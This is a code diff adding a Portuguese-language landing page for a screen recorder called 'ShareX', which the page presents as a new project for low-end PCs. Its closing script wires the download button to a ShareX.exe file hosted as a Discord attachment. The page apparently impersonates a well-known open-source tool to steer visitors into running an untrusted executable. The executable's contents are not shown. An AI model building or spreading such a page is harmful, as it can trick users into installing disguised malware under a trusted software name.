@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#090a0d">
+  <meta name="description" content="ShareX: um gravador de tela leve, simples e otimizado para PCs médios e mais modestos.">
+  <title>ShareX — Grave sua tela sem complicação</title>
+  <link rel="icon" type="image/svg+xml" href="favicon.svg">
+  <style>
+    :root{--bg:#090a0d;--panel:#111319;--panel2:#171a22;--text:#f6f7fb;--muted:#a8adba;--red:#ff2638;--red2:#c91428;--line:#282c36;--max:1160px}
+    *{box-sizing:border-box} html{scroll-behavior:smooth} body{margin:0;background:radial-gradient(ellipse at 80% 12%,#361018 0,transparent 32%),var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;line-height:1.6}
+    a{color:inherit;text-decoration:none}.wrap{width:min(var(--max),calc(100% - 40px));margin:auto}
+    header{position:sticky;top:0;z-index:10;background:#090a0deF;border-bottom:1px solid #242630;backdrop-filter:blur(14px)}
+    .nav{height:76px;display:flex;align-items:center;justify-content:space-between;gap:24px}.brand{display:flex;align-items:center;gap:12px;font-size:1.45rem;font-weight:850;letter-spacing:-.05em}.brand b{color:var(--red)}
+    .logo{width:42px;height:42px}.links{display:flex;gap:30px;color:#c6c9d2;font-size:.94rem}.links a:hover{color:white}.nav-cta,.btn{display:inline-flex;align-items:center;justify-content:center;gap:10px;border-radius:999px;background:linear-gradient(135deg,#ff3345,#d91027);color:white;font-weight:750;box-shadow:0 9px 30px #f21d3329;transition:.2s transform,.2s box-shadow}.nav-cta{padding:11px 19px}.btn{padding:15px 25px;font-size:1rem}.nav-cta:hover,.btn:hover{transform:translateY(-2px);box-shadow:0 13px 34px #f21d3340}
+    .hero{padding:82px 0 72px;position:relative;overflow:hidden}.hero:before{content:"";position:absolute;width:500px;height:500px;border-radius:50%;background:#ed1b3020;filter:blur(90px);right:-130px;top:20px;pointer-events:none}
+    .hero-grid{display:grid;grid-template-columns:1.04fr .96fr;align-items:center;gap:58px;position:relative}.eyebrow{display:inline-flex;align-items:center;gap:9px;border:1px solid #5b202a;background:#1d1015;color:#ff8791;padding:7px 12px;border-radius:99px;font-size:.82rem;font-weight:700}.dot{width:7px;height:7px;border-radius:50%;background:var(--red);box-shadow:0 0 12px var(--red)}
+    h1{font-size:clamp(2.7rem,6vw,5.1rem);line-height:1.02;letter-spacing:-.065em;margin:22px 0 20px}h1 span,.accent{color:var(--red)}.lead{font-size:1.16rem;color:#c1c5cf;max-width:590px}.actions{display:flex;align-items:center;gap:14px;flex-wrap:wrap;margin-top:30px}.secondary{border:1px solid #454955;background:#14161d;color:#f4f4f6;box-shadow:none}.fine{font-size:.86rem;color:#8e94a2;margin:14px 0 0 4px}
+    .app-card{background:linear-gradient(145deg,#1b1e27,#0e1015);border:1px solid #48404a;border-radius:22px;padding:18px;box-shadow:0 30px 80px #0009,0 0 55px #ff23321c;transform:rotate(1deg)}.app-top{display:flex;align-items:center;justify-content:space-between;padding:4px 5px 18px;color:#e9eaf0;font-weight:750}.app-brand{display:flex;align-items:center;gap:9px}.mini-logo{width:25px}.status{font-size:.75rem;color:#aeb4c1;font-weight:500}.status i{display:inline-block;width:7px;height:7px;background:#36d98b;border-radius:50%;margin-right:6px}
+    .app-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}.app-tile{background:#222630;border:1px solid #343946;border-radius:13px;padding:19px 14px;min-height:105px}.tile-icon{font-size:1.5rem;color:#ff4352}.app-tile strong{display:block;margin-top:8px;font-size:.9rem}.app-tile small{color:#9da4b2}.app-bottom{display:flex;justify-content:space-between;align-items:center;background:#191c24;border:1px solid #303541;border-radius:12px;padding:13px 15px;margin-top:11px;font-size:.83rem;color:#c9ced8}.rec{color:#ff6874;font-weight:700}
+    .strip{border-block:1px solid var(--line);background:#0e1015}.strip-grid{display:grid;grid-template-columns:repeat(4,1fr);padding:22px 0;gap:16px}.point{display:flex;align-items:center;gap:12px;color:#dce0e8;font-size:.91rem}.point span{font-size:1.35rem;color:var(--red)}
+    section{padding:78px 0}.section-head{text-align:center;max-width:690px;margin:0 auto 38px}.section-head h2{font-size:clamp(2rem,4vw,3rem);letter-spacing:-.045em;line-height:1.1;margin:0 0 14px}.section-head p{color:var(--muted);margin:0}
+    .features{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}.feature{padding:25px;border:1px solid var(--line);background:linear-gradient(145deg,#151820,#0e1015);border-radius:17px}.feature-icon{width:44px;height:44px;display:grid;place-items:center;border-radius:13px;background:#35151c;color:#ff5361;font-size:1.3rem;margin-bottom:17px}.feature h3{margin:0 0 7px;font-size:1.08rem}.feature p{margin:0;color:var(--muted);font-size:.94rem}
+    .about{display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center}.about h2{font-size:clamp(2rem,4vw,2.8rem);letter-spacing:-.05em;line-height:1.1;margin:0 0 17px}.about p{color:var(--muted)}.checklist{list-style:none;padding:0;margin:22px 0 0}.checklist li{margin:12px 0;color:#e0e3e9}.checklist li:before{content:"✓";display:inline-grid;place-items:center;background:var(--red);color:white;font-weight:900;border-radius:50%;width:21px;height:21px;font-size:.75rem;margin-right:11px}
+    .performance{border:1px solid #4a252d;background:linear-gradient(100deg,#211117,#13151c 70%);border-radius:20px;padding:28px 32px;display:flex;justify-content:space-between;align-items:center;gap:24px}.performance h3{margin:0 0 5px;font-size:1.35rem}.performance p{margin:0;color:var(--muted)}.perf-icon{font-size:2.5rem;color:var(--red)}
+    .faq{max-width:800px;margin:auto}.faq details{border-bottom:1px solid var(--line);padding:19px 2px}.faq summary{cursor:pointer;font-weight:700}.faq p{color:var(--muted);margin-bottom:0}
+    .final-cta{text-align:center;background:radial-gradient(ellipse at center,#45121d 0,transparent 67%);padding:80px 0}.final-cta h2{font-size:clamp(2.2rem,5vw,3.6rem);letter-spacing:-.05em;line-height:1.05;margin:0 0 15px}.final-cta p{color:var(--muted);margin:0 auto 25px;max-width:600px}
+    footer{border-top:1px solid var(--line);padding:25px 0;color:#858b98;font-size:.85rem}.footer-inner{display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap}
+    .notice{display:none;margin-top:12px;color:#ff9aa3;font-size:.9rem}.notice.show{display:block}
+    @media(max-width:850px){.links{display:none}.hero-grid,.about{grid-template-columns:1fr}.hero{padding:58px 0}.app-card{max-width:560px;width:100%;margin:0 auto}.strip-grid{grid-template-columns:repeat(2,1fr)}.features{grid-template-columns:repeat(2,1fr)}}
+    @media(max-width:560px){.wrap{width:min(var(--max),calc(100% - 28px))}.nav{height:66px}.brand{font-size:1.2rem}.logo{width:36px}.nav-cta{font-size:.82rem;padding:9px 12px}.hero{padding:46px 0}.lead{font-size:1.02rem}.actions{align-items:stretch;flex-direction:column}.btn{width:100%}.strip-grid,.features{grid-template-columns:1fr}.point{padding:4px 0}.app-card{padding:12px}.app-tile{padding:14px 10px}.performance{align-items:flex-start;padding:23px;flex-direction:column}section{padding:58px 0}}
+  </style>
+</head>
+<body>
+<header><div class="wrap nav">
+  <a class="brand" href="#inicio" aria-label="ShareX início">
+    <svg class="logo" viewBox="0 0 64 64" aria-hidden="true"><path d="M21 7H15a8 8 0 0 0-8 8v6M43 7h6a8 8 0 0 1 8 8v6M7 43v6a8 8 0 0 0 8 8h6M57 43v6a8 8 0 0 1-8 8h-6" fill="none" stroke="#ff2638" stroke-width="7" stroke-linecap="round"/><rect x="18" y="21" width="28" height="22" rx="6" fill="#fff"/><path d="m46 27 11-7v24l-11-7z" fill="#fff"/></svg>
+    Share<span class="accent">X</span>
+  </a>
+  <nav class="links"><a href="#inicio">Início</a><a href="#recursos">Recursos</a><a href="#sobre">Sobre</a><a href="#faq">FAQ</a></nav>
+  <a class="nav-cta" href="#download">↓ &nbsp;Baixar agora</a>
+</div></header>
+<main>
+  <section class="hero" id="inicio"><div class="wrap hero-grid">
+    <div>
+      <div class="eyebrow"><span class="dot"></span> NOVO GRAVADOR DE TELA</div>
+      <h1>Grave sua tela.<br><span>Sem complicação.</span></h1>
+      <p class="lead">Conheça o ShareX: um gravador de tela pensado para ser simples, leve e eficiente, com foco em PCs médios e computadores mais modestos.</p>
+      <div class="actions"><a class="btn" href="#download">↓ &nbsp;Baixar ShareX</a><a class="btn secondary" href="#recursos">Conhecer recursos &nbsp;→</a></div>
+      <p class="fine">Leve no visual. Simples de usar. Feito para o dia a dia.</p>
+    </div>
+    <div class="app-card" aria-label="Prévia ilustrativa da interface do ShareX">
+      <div class="app-top"><div class="app-brand"><svg class="mini-logo" viewBox="0 0 64 64"><path d="M21 7H15a8 8 0 0 0-8 8v6M43 7h6a8 8 0 0 1 8 8v6M7 43v6a8 8 0 0 0 8 8h6M57 43v6a8 8 0 0 1-8 8h-6" fill="none" stroke="#ff2638" stroke-width="8" stroke-linecap="round"/><rect x="18" y="21" width="28" height="22" rx="6" fill="#fff"/></svg> ShareX</div><span class="status"><i></i> Interface de exemplo</span></div>
+      <div class="app-grid">
+        <div class="app-tile"><div class="tile-icon">▣</div><strong>Tela inteira</strong><small>Grave tudo</small></div>
+        <div class="app-tile"><div class="tile-icon">▧</div><strong>Área selecionada</strong><small>Escolha uma região</small></div>
+        <div class="app-tile"><div class="tile-icon">▶</div><strong>Jogos e apps</strong><small>Registre suas partidas</small></div>
+        <div class="app-tile"><div class="tile-icon">◉</div><strong>Captura prática</strong><small>Fluxo simplificado</small></div>
+      </div>
+      <div class="app-bottom"><span>● &nbsp;Pronto para começar</span><span class="rec">SHAREX</span></div>
+    </div>
+  </div></section>
+  <div class="strip"><div class="wrap strip-grid">
+    <div class="point"><span>✦</span><div><b>Leve</b><br><small>Foco em eficiência</small></div></div>
+    <div class="point"><span>ϟ</span><div><b>Prático</b><br><small>Uso descomplicado</small></div></div>
+    <div class="point"><span>▣</span><div><b>Versátil</b><br><small>Para diferentes atividades</small></div></div>
+    <div class="point"><span>⌘</span><div><b>Moderno</b><br><small>Visual limpo e atual</small></div></div>
+  </div></div>
+  <section id="recursos"><div class="wrap">
+    <div class="section-head"><h2>Tudo o que você precisa para <span class="accent">gravar</span></h2><p>Uma proposta direta: facilitar suas gravações sem deixar a experiência complicada.</p></div>
+    <div class="features">
+      <article class="feature"><div class="feature-icon">▣</div><h3>Gravação de tela</h3><p>Registre sua tela para criar tutoriais, demonstrações, aulas e outros conteúdos.</p></article>
+      <article class="feature"><div class="feature-icon">ϟ</div><h3>Foco em desempenho</h3><p>Projeto pensado para atender também quem utiliza um PC médio ou mais fraco.</p></article>
+      <article class="feature"><div class="feature-icon">⌖</div><h3>Uso descomplicado</h3><p>Uma experiência objetiva para você começar a gravar sem perder tempo.</p></article>
+      <article class="feature"><div class="feature-icon">▶</div><h3>Jogos e aplicativos</h3><p>Ideal para registrar partidas, mostrar processos ou apresentar programas.</p></article>
+      <article class="feature"><div class="feature-icon">▤</div><h3>Conteúdo e tutoriais</h3><p>Produza materiais para compartilhar conhecimento, explicar etapas e apresentar ideias.</p></article>
+      <article class="feature"><div class="feature-icon">⚙</div><h3>Em evolução</h3><p>O ShareX é um projeto novo, com espaço para receber melhorias e novos recursos.</p></article>
+    </div>
+  </div></section>
+  <section id="sobre"><div class="wrap">
+    <div class="about">
+      <div><h2>Um gravador feito para ser <span class="accent">acessível</span>.</h2><p>Nem todo mundo tem um computador de alto desempenho. Por isso, o ShareX nasce com uma proposta clara: oferecer uma opção de gravação de tela simples e com atenção especial ao consumo de recursos.</p><p>Seja para gravar uma explicação, registrar uma partida ou mostrar algo que acontece no seu computador, a ideia é deixar o processo mais fácil.</p>
+        <ul class="checklist"><li>Proposta leve e objetiva</li><li>Foco em PCs médios e modestos</li><li>Visual moderno e fácil de entender</li><li>Útil para trabalho, estudo e entretenimento</li></ul>
+      </div>
+      <div class="performance"><div><h3>Seu conteúdo em primeiro lugar.</h3><p>Menos complicação para começar a gravar e compartilhar.</p></div><div class="perf-icon">◉</div></div>
+    </div>
+  </div></section>
+  <section id="faq"><div class="wrap"><div class="section-head"><h2>Perguntas <span class="accent">frequentes</span></h2><p>Saiba mais sobre a proposta do ShareX.</p></div>
+    <div class="faq">
+      <details><summary>O ShareX é indicado para PC fraco?</summary><p>O projeto é pensado para priorizar leveza e atender PCs médios e mais modestos. O desempenho real pode variar conforme o hardware e as configurações de gravação.</p></details>
+      <details><summary>Para que posso usar o ShareX?</summary><p>Você pode usar um gravador de tela para tutoriais, aulas, demonstrações, apresentações, vídeos de jogos e para registrar atividades no computador.</p></details>
+      <details><summary>Como faço para baixar?</summary><p>Use o botão de download nesta página. O link será ativado assim que a versão para download estiver disponível.</p></details>
+      <details><summary>O ShareX já está disponível?</summary><p>Esta página está preparada para receber o instalador oficial. O botão será atualizado quando o arquivo ou link de download for fornecido.</p></details>
+    </div>
+  </div></section>
+  <section class="final-cta" id="download"><div class="wrap">
+    <h2>Pronto para conhecer o <span class="accent">ShareX</span>?</h2>
+    <p>Baixe o instalador do ShareX pelo botão abaixo e comece a conhecer o gravador.</p>
+    <button class="btn" id="downloadBtn" type="button">↓ &nbsp;Baixar ShareX</button>
+    <div class="notice" id="downloadNotice" role="status">O download ainda não foi configurado. Envie o arquivo ou o link para ativarmos este botão.</div>
+  </div></section>
+</main>
+<footer><div class="wrap footer-inner"><span>© 2026 ShareX. Todos os direitos reservados.</span><span>Grave. Crie. Compartilhe.</span></div></footer>
+<script>
+  // Quando receber o instalador, substitua o valor abaixo pelo link direto do arquivo.
+  const DOWNLOAD_URL = "https://cdn.discordapp.com/attachments/1566621412435828887/1569003511746928720/ShareX.exe?ex=6af87763&is=6af725e3&hm=6038668fd59e5cfc28961e5de869475fdf0b87c598bf6293840956ab84293079&";
+  const btn = document.getElementById("downloadBtn");
+  const notice = document.getElementById("downloadNotice");
+  if (DOWNLOAD_URL) {
+    btn.textContent = "↓  Baixar ShareX";
+    btn.addEventListener("click", () => window.location.href = DOWNLOAD_URL);
+  } else {
+    btn.addEventListener("click", () => notice.classList.add("show"));
+  }
+</script>
+</body>
+</html>
